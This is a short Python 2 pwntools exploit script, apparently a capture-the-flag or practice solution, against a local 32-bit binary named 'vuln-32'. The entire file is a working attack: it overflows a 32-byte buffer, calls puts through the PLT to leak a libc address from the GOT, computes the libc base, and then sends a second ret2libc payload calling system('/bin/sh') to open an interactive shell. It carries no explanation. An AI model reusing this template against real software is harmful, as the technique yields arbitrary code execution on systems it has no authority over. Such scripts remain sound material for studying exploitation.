#!/usr/bin/python2
from pwn import *

p = process('./vuln-32')
binary = context.binary = ELF('./vuln-32')
libc = binary.libc

p.recvline() #ngilangin printannya

payload = flat(
    'A'*32,
    binary.plt['puts'],
    binary.sym['main'],
    binary.got['puts']
)
p.sendline(payload)
# p.recvline('\n')
leak = u32(p.recv(4))
p.recvlines(2)

libc.address = leak - libc.sym['puts']
print(hex(libc.address))

payload = flat(
    'A'*32,
    libc.sym['system'],
    libc.sym['exit'],
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)
p.interactive()